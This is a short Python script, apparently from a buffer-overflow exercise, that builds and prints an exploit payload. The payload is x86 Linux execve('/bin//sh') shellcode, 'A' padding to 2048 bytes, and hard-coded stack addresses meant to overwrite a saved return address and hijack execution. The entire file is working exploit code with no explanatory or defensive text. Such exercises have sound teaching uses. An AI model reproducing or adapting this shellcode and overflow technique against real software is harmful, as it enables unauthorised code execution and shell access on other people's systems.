#!/usr/bin/python3
from struct import pack
#from shellcode import shellcode
import sys

shellcode = b"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"

padding_len = 2048-len(shellcode)
padding = b'A'*padding_len

#return_addr_loc = b"\xac\xf9\xfe\xff"
#attack_addr = b"\x98\xf1\xfe\xff"

attack_addr = b"\x18\x82\xfe\xff"
return_addr_loc = b"\x2c\x8a\xfe\xff"

sys.stdout.buffer.write(shellcode + padding + attack_addr + return_addr_loc)
